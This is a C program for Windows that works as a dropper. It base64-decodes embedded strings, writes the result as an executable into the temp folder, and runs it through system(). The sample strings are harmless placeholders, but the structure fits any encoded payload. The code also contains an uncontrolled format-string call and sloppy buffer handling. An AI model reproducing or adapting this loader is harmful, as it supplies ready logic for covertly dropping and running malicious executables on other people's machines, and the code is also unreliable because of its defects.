
#include <windows.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;

void build_decoding_table() {
    decoding_table = malloc(256);
    for (int i = 0; i < 64; i++)
        decoding_table[(unsigned char)encoding_table[i]] = i;
}

unsigned char *base64_decode(const char *data, size_t input_length, size_t *output_length) {
    if (decoding_table == NULL)
        build_decoding_table();
    if (input_length % 4 != 0)
        return NULL;
    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=')
        (*output_length)--;
    if (data[input_length - 2] == '=')
        (*output_length)--;
    unsigned char *decoded_data = malloc(*output_length + 1);
    if (decoded_data == NULL)
        return NULL;
    for (int i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6);
        if (j < *output_length)
            decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length)
            decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length)
            decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
    decoded_data[*output_length] = '\0';
    return decoded_data;
}

void base64_cleanup() {
    free(decoding_table);
}


// Function to decode Base64 data
unsigned char *base64_decode(const char *data, size_t input_length, size_t *output_length);

int main() {

    const char *encoded_strings[] = {"SGVsbG8gd29ybGQ=", "SGVsbG8gd29ybGQ="};
    int num_strings = sizeof(encoded_strings) / sizeof(encoded_strings[0]);

    for (int i = 0; i < num_strings; i++) {
        const char *encoded_data = encoded_strings[i];
        size_t encoded_length = strlen(encoded_data);
        size_t decoded_length;
        unsigned char *decoded_data = base64_decode(encoded_data, encoded_length, &decoded_length);

        if (decoded_data != NULL) {
            char str[100];
            char tempPath[MAX_PATH];
            DWORD tempPathResult = GetTempPathA(MAX_PATH, tempPath);

            if (tempPathResult > 0 && tempPathResult <= MAX_PATH) {
                printf("Temporary Path: %s\n", tempPath);
            } else {
                printf("Failed to retrieve the temporary path.\n");
            }

            char tempFileName[L_tmpnam];
            char temp_file[sizeof(tempFileName) - 1];
            if (tmpnam(tempFileName) != NULL) {
                    memmove(temp_file, tempFileName + 1, sizeof(tempFileName) - 1);
            } else {
                printf("Failed to generate temporary file name.\n");
            }
            strcat(tempPath, temp_file);
            strcat(tempPath, "exe");
            printf(tempPath);
            FILE* execute = fopen(tempPath, "wb");
            if (execute == NULL) {
                printf("Failed to open the temporary file.\n");
                return 1;
            }
            fwrite(decoded_data, sizeof(unsigned char), decoded_length, execute);
            fclose(execute);
            char command[256];
            snprintf(command, sizeof(command), "%s", tempPath);
            int result = system(command);
            if (result == -1) {
                printf("Failed to execute the temporary file.\n");
                return 1;
            }

            // Free the memory allocated for decoded data
            free(decoded_data);
        }
    }

    return 0;
}
